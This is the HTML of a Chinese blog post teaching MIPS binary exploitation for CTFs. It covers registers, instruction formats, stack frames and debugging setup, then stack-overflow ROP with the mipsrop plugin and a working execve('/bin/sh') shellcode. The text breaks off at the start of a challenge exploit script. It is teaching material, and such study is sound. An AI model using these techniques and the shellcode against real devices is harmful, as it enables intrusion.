@@ -1,0 +1,793 @@
+
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+    <meta charset="utf-8" />
+    <title>mips_pwn | Collectcrop&#39;s Blog</title>
+    <meta name="author" content="collectcrop" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>COLLECTCROP&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;COLLECTCROP&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>mips_pwn</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/9/21
+        </span>
+        
+        <span class="category">
+            <a href="/categories/pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                pwn
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #03a9f4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/mips/" style="color: #ffa2c4">
+                    mips
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h4 id="一、mips架构概述"><a href="#一、mips架构概述" class="headerlink" title="一、mips架构概述"></a>一、mips架构概述</h4><h5 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h5><table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th>别名</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$0</td>
+<td>$zero</td>
+<td>常量0</td>
+</tr>
+<tr>
+<td align="left">$1</td>
+<td>$at</td>
+<td>保留给汇编器（Assembler Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
+</tr>
+<tr>
+<td align="left">$2-$3</td>
+<td>$v0-$v1</td>
+<td>用于存储函数的返回值。</td>
+</tr>
+<tr>
+<td align="left">$4-$7</td>
+<td>$a0-$a3</td>
+<td>函数调用参数，用于传递最多 4 个函数参数。</td>
+</tr>
+<tr>
+<td align="left">$8-$15</td>
+<td>$t0-$t7</td>
+<td>临时寄存器。用于函数内部的临时计算，不需要保存其值。</td>
+</tr>
+<tr>
+<td align="left">$16-$23</td>
+<td>$s0-$s7</td>
+<td>保存寄存器。用于保存函数调用期间的值，调用函数时需要保留的值。</td>
+</tr>
+<tr>
+<td align="left">$24-$25</td>
+<td>$t8-$t9</td>
+<td>临时寄存器。与 <code>$t0-$t7</code> 类似，但通常不需要在函数调用中保存其值。</td>
+</tr>
+<tr>
+<td align="left">$26-$27</td>
+<td>$k0-$k1</td>
+<td>保留给操作系统内核。通常用于内核中进行系统调用或中断处理。</td>
+</tr>
+<tr>
+<td align="left">$28</td>
+<td>$gp</td>
+<td>全局指针。指向全局数据区域的基地址，便于访问全局变量。</td>
+</tr>
+<tr>
+<td align="left">$29</td>
+<td>$sp</td>
+<td>堆栈指针。指向当前堆栈的顶部，用于管理函数调用和局部变量。</td>
+</tr>
+<tr>
+<td align="left">$30</td>
+<td>$fp($s8)</td>
+<td>帧指针。指向当前栈帧的基地址，通常用于访问局部变量和参数。</td>
+</tr>
+<tr>
+<td align="left">$31</td>
+<td>$ra</td>
+<td>返回地址。用于存储函数调用的返回地址，在函数调用时保存，并在函数返回时使用。</td>
+</tr>
+<tr>
+<td align="left">PC</td>
+<td>PC</td>
+<td>保存当前正在执行的指令的地址，并在每次指令执行后自动递增，以指向下一条指令的地址。</td>
+</tr>
+</tbody></table>
+<p>mips架构中的fp寄存器相当于rbp，pc寄存器相当于rip。</p>
+<h5 id="2-特征"><a href="#2-特征" class="headerlink" title="2.特征"></a>2.特征</h5><ul>
+<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p>
+</li>
+<li><p><strong>MIPS 处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p>
+</li>
+<li><p>所有 MIPS 指令都具有固定的 32 位长度，这使得指令解码更加简单和高效。</p>
+</li>
+<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS 也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p>
+</li>
+<li><p>三种主要指令格式：</p>
+<ul>
+<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</li>
+<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</li>
+<li><strong>J 型</strong>：用于跳转，例如 <code>j</code>、<code>jal</code>。</li>
+</ul>
+</li>
+<li><p>流水线操作</p>
+<p>MIPS架构采用了流水线技术来提高指令执行的效率。流水线允许处理器同时处理多条指令的不同部分，从而大幅提高吞吐量。</p>
+<p>常见的MIPS芯片流水线操作分为五个阶段：</p>
+<ul>
+<li><strong>IF（Instruction Fetch，指令提取）</strong>：从内存中提取指令。</li>
+<li><strong>ID（Instruction Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
+<li><strong>EX（Execute，执行）</strong>：执行指令，包括算术运算、逻辑运算等。</li>
+<li><strong>MEM（Memory Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
+<li><strong>WB（Write Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
+</ul>
+<p>在理想情况下，流水线中的每个阶段都会同时进行，使得处理器可以每个时钟周期执行一条新指令。然而，由于某些指令的执行需要更多的时间，可能会导致流水线暂停（称为“流水线停顿”），从而影响性能。</p>
+<p><strong>分支延迟槽</strong></p>
+<p>MIPS架构有一个特殊的概念叫<strong>分支延迟槽</strong>。当程序遇到分支指令（如跳转指令）时，程序会跳转到新的地址去执行新指令。然而，由于流水线的设计，紧接在分支指令之后的指令已经在流水线中开始执行了。为了避免浪费，MIPS架构规定，<strong>分支后的第一条指令（即位于分支延迟槽中的指令）会在跳转之前执行</strong>。</p>
+<p>这意味着，在编写MIPS汇编代码或分析MIPS的二进制文件时，需要特别注意分支延迟槽的存在。例如，在以下MIPS汇编代码中：</p>
+<pre><code class="asm">.text:0007F944    move    $t9, $s0
+.text:0007F948    jalr    $t9              
+.text:0007F94C    move    $a0, $s1
+</code></pre>
+<p>虽然<code>jalr</code>指令是一个跳转指令，但紧接在其后的<code>move $a0, $s1</code>指令会在跳转之前执行。</p>
+<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p>
+</li>
+</ul>
+<h5 id="3-指令格式"><a href="#3-指令格式" class="headerlink" title="3.指令格式"></a>3.指令格式</h5><blockquote>
+<p>op:指令基本操作，称为操作码。<br>rs:第一个源操作数寄存器。<br>rt:第二个源操作数寄存器。<br>rd:存放操作结果的目的操作数。<br>shamt:位移量；<br>funct:函数，这个字段选择op操作的某个特定变体。  </p>
+</blockquote>
+<p>32位长度分配如下</p>
+<p><strong>R格式</strong>   </p>
+<table>
+<thead>
+<tr>
+<th>6</th>
+<th>5</th>
+<th>5</th>
+<th>5</th>
+<th>5</th>
+<th>6</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>op</td>
+<td>rs</td>
+<td>rt</td>
+<td>rd</td>
+<td>shamt</td>
+<td>funct</td>
+</tr>
+</tbody></table>
+<p> 用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</p>
+<p><strong>I格式</strong>      </p>
+<table>
+<thead>
+<tr>
+<th>6</th>
+<th>5</th>
+<th>5</th>
+<th>16</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>op</td>
+<td>rs</td>
+<td>rt</td>
+<td>立即数操作</td>
+</tr>
+</tbody></table>
+<p>用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</p>
+<p><strong>J格式</strong>   </p>
+<table>
+<thead>
+<tr>
+<th>6</th>
+<th>26</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>op</td>
+<td>跳转地址</td>
+</tr>
+</tbody></table>
+<p>用于跳转，例如 <code>j</code>、<code>jal</code>。</p>
+<h5 id="4-常用指令"><a href="#4-常用指令" class="headerlink" title="4.常用指令"></a>4.常用指令</h5><table>
+<thead>
+<tr>
+<th><strong>指令</strong></th>
+<th><strong>功能</strong></th>
+<th><strong>语法</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>add</code></strong></td>
+<td>加法（有符号）</td>
+<td><code>add $rd, $rs, $rt</code></td>
+<td><code>add $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>addu</code></strong></td>
+<td>加法（无符号）</td>
+<td><code>addu $rd, $rs, $rt</code></td>
+<td><code>addu $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>sub</code></strong></td>
+<td>减法（有符号）</td>
+<td><code>sub $rd, $rs, $rt</code></td>
+<td><code>sub $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>subu</code></strong></td>
+<td>减法（无符号）</td>
+<td><code>subu $rd, $rs, $rt</code></td>
+<td><code>subu $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值（无符号），结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>and</code></strong></td>
+<td>按位与</td>
+<td><code>and $rd, $rs, $rt</code></td>
+<td><code>and $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>or</code></strong></td>
+<td>按位或</td>
+<td><code>or $rd, $rs, $rt</code></td>
+<td><code>or $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>xor</code></strong></td>
+<td>按位异或</td>
+<td><code>xor $rd, $rs, $rt</code></td>
+<td><code>xor $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>nor</code></strong></td>
+<td>按位与非</td>
+<td><code>nor $rd, $rs, $rt</code></td>
+<td><code>nor $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>sll</code></strong></td>
+<td>左移</td>
+<td><code>sll $rd, $rt, shamt</code></td>
+<td><code>sll $t0, $t1, 2</code></td>
+<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>srl</code></strong></td>
+<td>逻辑右移</td>
+<td><code>srl $rd, $rt, shamt</code></td>
+<td><code>srl $t0, $t1, 2</code></td>
+<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>sra</code></strong></td>
+<td>算术右移</td>
+<td><code>sra $rd, $rt, shamt</code></td>
+<td><code>sra $t0, $t1, 2</code></td>
+<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code> 中</td>
+</tr>
+<tr>
+<td><strong><code>lw</code></strong></td>
+<td>加载字（32 位）</td>
+<td><code>lw $rt, offset($rs)</code></td>
+<td><code>lw $t0, 4($a0)</code></td>
+<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到 <code>$t0</code>。</td>
+</tr>
+<tr>
+<td><strong><code>sw</code></strong></td>
+<td>存储字（32 位）</td>
+<td><code>sw $rt, offset($rs)</code></td>
+<td><code>sw $t0, 4($a0)</code></td>
+<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code> 处。</td>
+</tr>
+<tr>
+<td><strong><code>lb</code></strong></td>
+<td>加载字节（8 位）</td>
+<td><code>lb $rt, offset($rs)</code></td>
+<td><code>lb $t0, 0($a0)</code></td>
+<td>从地址 <code>$a0</code> 处加载 1 字节数据到 <code>$t0</code>。</td>
+</tr>
+<tr>
+<td><strong><code>sb</code></strong></td>
+<td>存储字节（8 位）</td>
+<td><code>sb $rt, offset($rs)</code></td>
+<td><code>sb $t0, 0($a0)</code></td>
+<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code> 处。</td>
+</tr>
+<tr>
+<td><strong><code>lui</code></strong></td>
+<td>加载上半字（立即数）</td>
+<td><code>lui $rt, imm</code></td>
+<td><code>lui $t0, 0x1234</code></td>
+<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低 16 位为 0）。</td>
+</tr>
+<tr>
+<td><strong><code>ori</code></strong></td>
+<td>立即数按位或</td>
+<td><code>ori $rt, $rs, imm</code></td>
+<td><code>ori $t0, $t1, 0xFF</code></td>
+<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>beq</code></strong></td>
+<td>等于分支</td>
+<td><code>beq $rs, $rt, offset</code></td>
+<td><code>beq $t0, $t1, label</code></td>
+<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
+</tr>
+<tr>
+<td><strong><code>bne</code></strong></td>
+<td>不等于分支</td>
+<td><code>bne $rs, $rt, offset</code></td>
+<td><code>bne $t0, $t1, label</code></td>
+<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
+</tr>
+<tr>
+<td><strong><code>j</code></strong></td>
+<td>无条件跳转</td>
+<td><code>j target</code></td>
+<td><code>j label</code></td>
+<td>跳转到 <code>label</code> 处。</td>
+</tr>
+<tr>
+<td><strong><code>jal</code></strong></td>
+<td>跳转并链接</td>
+<td><code>jal target</code></td>
+<td><code>jal subroutine</code></td>
+<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code> 寄存器中。</td>
+</tr>
+<tr>
+<td><strong><code>jr</code></strong></td>
+<td>跳转寄存器</td>
+<td><code>jr $rs</code></td>
+<td><code>jr $ra</code></td>
+<td>跳转到 <code>$ra</code> 寄存器中存储的地址。</td>
+</tr>
+<tr>
+<td><strong><code>nop</code></strong></td>
+<td>空操作</td>
+<td><code>nop</code></td>
+<td><code>nop</code></td>
+<td>什么也不做，通常用于填充延迟槽。</td>
+</tr>
+</tbody></table>
+<pre><code class="asm">or         s8,sp,zero		#实现了x86架构中的mov功能，相当于mov s8,sp
+</code></pre>
+<h5 id="5-MIPS栈帧结构"><a href="#5-MIPS栈帧结构" class="headerlink" title="5.MIPS栈帧结构"></a>5.MIPS栈帧结构</h5><p>典型的MIPS栈帧结构包括以下部分：</p>
+<pre><code>+-------------------------+ &lt;-- 栈顶（高地址）
+|  返回地址（$ra）          | 保存调用者的返回地址
++-------------------------+
+|  上一个栈帧的栈指针        | 保存调用者的栈底指针（$fp）
++-------------------------+
+|  函数参数（如果需要）      | 超过寄存器数量的函数参数存放在栈中
++-------------------------+
+|  局部变量                | 局部变量、临时数据等
++-------------------------+
+|  ...                    | 其他数据
++-------------------------+
+|                         |
+|  栈空闲区                |
+|                         |
++-------------------------+ &lt;-- 栈底（低地址）
+</code></pre>
+<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过$sp或$fp进行的。</p>
+<p>mips函数调用基本格式，其中分为叶子函数和非叶子函数，一般pwn题中做的都是非叶子函数，因为main函数之前程序还会执行其他初始化函数。</p>
+<p><strong>叶子函数</strong>和<strong>非叶子函数</strong>的主要区别在于它们是否调用其他函数：</p>
+<ul>
+<li><strong>叶子函数</strong>：<ul>
+<li><strong>定义</strong>：叶子函数是指在其内部不调用任何其他函数的函数。</li>
+<li>特点<ul>
+<li>由于不调用其他函数，因此不需要保存和恢复返回地址（即<code>$ra</code>寄存器的值）。</li>
+<li>叶子函数通常不需要额外的栈操作，因为它不需要保存其他函数的返回地址或其他寄存器的值。</li>
+<li>返回时直接使用<code>jr $ra</code>指令跳转回调用者。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>非叶子函数</strong>：<ul>
+<li><strong>定义</strong>：非叶子函数是指在其内部会调用其他函数的函数。</li>
+<li>特点<ul>
+<li>由于可能调用其他函数，需要保存当前函数的返回地址（存储在<code>$ra</code>寄存器中）到栈中，以防止被覆盖。</li>
+<li>非叶子函数通常需要调整栈指针（<code>$sp</code>）并保存调用者的返回地址、寄存器状态等信息。</li>
+<li>在返回时，需要从栈中恢复保存的返回地址和寄存器状态，然后使用<code>jr $ra</code>指令返回到调用者。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>简而言之，叶子函数不会调用其他函数，因此对栈的操作较少；而非叶子函数会调用其他函数，因此需要处理更多的栈操作来保存和恢复状态。</p>
+<p>非叶子函数：</p>
+<pre><code class="asm">#Prologue
+addiu      sp,sp,-0x60				#栈上开辟空间
+sw         ra,local_4 (sp)			#存返回地址
+sw         s8,local_8 (sp)			#存该函数的栈底
+or         s8,sp,zero
+lui        gp,0x4a
+addiu      gp,gp,-0x5d50			#设置全局变量的指针
+sw         gp=&gt;_gp ,local_50 (sp)
+...
+#Epilogue
+lw         gp,local_50 (s8)
+or         v0,zero ,zero
+or         sp,s8,zero
+lw         ra,local_4 (sp)
+lw         s8,local_8 (sp)
+addiu      sp,sp,0x60
+jr         ra
+...
+#args offered
+li         a2,0x100						#size
+addiu      v0,s8,0x18
+or         a1,v0,zero					#buf
+or         a0,zero ,zero				#fd
+lw         v0,-0x7f90 (gp)		=&gt;-&gt;read                     
+or         t9,v0,zero
+bal        read                           
+</code></pre>
+<p>叶子函数：</p>
+<pre><code class="assembly"># 执行函数B的任务
+# 不调用其他函数
+# 直接返回
+jr $ra
+</code></pre>
+<h4 id="二、mips环境搭建"><a href="#二、mips环境搭建" class="headerlink" title="二、mips环境搭建"></a>二、mips环境搭建</h4><h5 id="1-安装qemu"><a href="#1-安装qemu" class="headerlink" title="1.安装qemu"></a>1.安装qemu</h5><pre><code class="bash">sudo apt install qemu
+#check if qemu existed
+qemu --version
+</code></pre>
+<h5 id="2-安装gdb-multiarch"><a href="#2-安装gdb-multiarch" class="headerlink" title="2.安装gdb-multiarch"></a>2.安装gdb-multiarch</h5><pre><code class="bash">sudo apt install gdb-multiarch
+#check if gdb-multiarch downloaded successfully
+gdb-multiarch --version
+</code></pre>
+<h5 id="3-安装ghidra"><a href="#3-安装ghidra" class="headerlink" title="3.安装ghidra"></a>3.安装ghidra</h5><p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays Decompiler插件</p>
+<p>ghidra下载地址：<a target="_blank" rel="noopener" href="https://github.com/NationalSecurityAgency/ghidra/releases">https://github.com/NationalSecurityAgency/ghidra/releases</a></p>
+<p>运行ghidra还需要JDK17及以上的环境</p>
+<p>jdk下载地址：<a target="_blank" rel="noopener" href="https://adoptium.net/zh-CN/">https://adoptium.net/zh-CN/</a></p>
+<p><strong>启动 Ghidra</strong>：</p>
+<ul>
+<li><p>Windows</p>
+<ul>
+<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动 Ghidra。</li>
+</ul>
+</li>
+<li><p>Linux&#x2F;macOS</p>
+<ul>
+<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动 Ghidra：</p>
+<pre><code>./ghidraRun
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>初次运行设置</strong>：</p>
+<ul>
+<li>Ghidra 启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
+<li>阅读并接受用户协议后，Ghidra 会启动并显示主界面。</li>
+</ul>
+<h5 id="4-安装IDA插件mipsrop"><a href="#4-安装IDA插件mipsrop" class="headerlink" title="4.安装IDA插件mipsrop"></a>4.安装IDA插件mipsrop</h5><p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
+<pre><code class="bash">git clone https://github.com/devttys0/ida.git ida-plugins
+</code></pre>
+<p>mipsrop.py在 ida-plugins&#x2F;plugins&#x2F;mipsrop目录下，将其复制进IDA的plugins目录即可</p>
+<p><strong>可能遇到的问题</strong></p>
+/2024/09/21/mips-pwn/image-20240921180630264.png
+
+<p>在ida-plugins&#x2F;plugins目录下还有个shims文件夹，将其也复制到IDA的plugins目录就行。</p>
+<h5 id="5-调试方法"><a href="#5-调试方法" class="headerlink" title="5.调试方法"></a>5.调试方法</h5><pre><code class="bash">qemu-mipsel-static -g 6666 -L ./ ./program		#开的端口是6666
+</code></pre>
+<p>之后用gdb连接</p>
+<pre><code class="bash">gdb-multiarch program
+pwndbg&gt; target remote 127.0.0.1:6666
+</code></pre>
+<p>在python写pwn利用脚本过程中，可以在在process中指定打开的端口，然后附加到gdb时就可以连接。</p>
+<pre><code class="python">programe = &#39;your_program&#39;
+p = process([&quot;qemu-mipsel-static&quot;, &quot;-g&quot;, &quot;6666&quot;, &quot;-L&quot;, &quot;./&quot;, program])
+gdb.attach(p,f&#39;&#39;&#39;
+    file &#123;program&#125;
+    target remote 127.0.0.1:6666
+    b main
+    c
+    &#39;&#39;&#39;)
+</code></pre>
+<h4 id="三、mips的一些栈上漏洞利用"><a href="#三、mips的一些栈上漏洞利用" class="headerlink" title="三、mips的一些栈上漏洞利用"></a>三、mips的一些栈上漏洞利用</h4><p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
+<h5 id="1-栈溢出-syscall"><a href="#1-栈溢出-syscall" class="headerlink" title="1.栈溢出+syscall"></a>1.栈溢出+syscall</h5><p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
+<p>由于mips架构是没有NX保护的，其实我们可以把shellcode写到栈上后想办法跳转到shellcode处执行。</p>
+<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control jump中为jalr $fp的那个，因为$fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
+/2024/09/21/mips-pwn/image-20240921180732229.png
+
+<p>然后既然能控制$a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到$a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
+/2024/09/21/mips-pwn/image-20240921180805478.png
+
+<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在<a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=mips_o32%E8%BF%99%E6%9F%A5%EF%BC%8Cv0%E5%AD%98%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%EF%BC%8Ca0%EF%BC%8Ca1%EF%BC%8Ca2%E5%88%86%E5%88%AB%E5%AD%98%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E5%88%B0%E6%A0%88%E9%A1%B6%EF%BC%8C%E5%9C%A8%E6%8A%8A%E5%8F%82%E6%95%B0%E6%8C%87%E5%90%91$sp%EF%BC%8C%E5%B0%B1%E8%83%BD%E5%AE%9E%E7%8E%B0%E5%AD%97%E7%AC%A6%E5%8F%82%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92%E4%BA%86%E3%80%82">https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。</a></p>
+<pre><code class="python">shellcode = &quot;&quot;&quot;
+li $v0,0xfab		
+li $t0,0x0068732f
+li $t1,0x6e69622f
+addi $sp,$sp,-4
+sw $t0, 0($sp)
+addi $sp,$sp,-4
+sw $t1, 0($sp)
+or $a0,$sp,$zero
+or $a1,$zero,$zero
+or $a2,$zero,$zero
+syscall
+&quot;&quot;&quot;
+</code></pre>
+<p>这里需要注意的一点是execve的第一个参数最好是&#x2F;bin&#x2F;sh，如果图方便只传进去一个sh，因为后面的环境变量参数置零了，很可能会找不到sh报警告，继续向下执行。</p>
+/2024/09/21/mips-pwn/image-20240921180832554.png
+
+<h4 id="四、题目复现"><a href="#四、题目复现" class="headerlink" title="四、题目复现"></a>四、题目复现</h4><h5 id="xyctf2024-Ez1-0"><a href="#xyctf2024-Ez1-0" class="headerlink" title="[xyctf2024]Ez1.0"></a>[xyctf2024]Ez1.0</h5>/2024/09/21/mips-pwn/image-20240921180859013.png
+
+<p>非常简单粗暴的栈溢出，根据上述漏洞利用原理构造即可</p>
+<pre><code class="python">from pwn import *
